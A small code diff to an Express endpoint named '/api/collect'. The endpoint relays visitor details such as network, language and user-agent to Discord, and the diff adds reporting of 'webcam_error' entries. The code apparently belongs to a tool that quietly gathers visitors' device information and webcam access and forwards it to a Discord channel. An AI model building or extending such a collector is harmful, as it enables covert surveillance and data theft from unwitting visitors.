@@ -103,6 +103,8 @@ app.post('/api/collect', (req, res) => {
       msgLines.push(`**Network:** ${entry.network || 'N/A'}`);
       msgLines.push(`**Language:** ${entry.language || 'N/A'}`);
       msgLines.push(`**User-Agent:** \`${entry.userAgent}\``);
+    } else if (entry.type === 'webcam_error') {
+      msgLines.push(`**Error:** \`${entry.error}\``);
     }
     sendToDiscord({ content: msgLines.join('\n') });
 
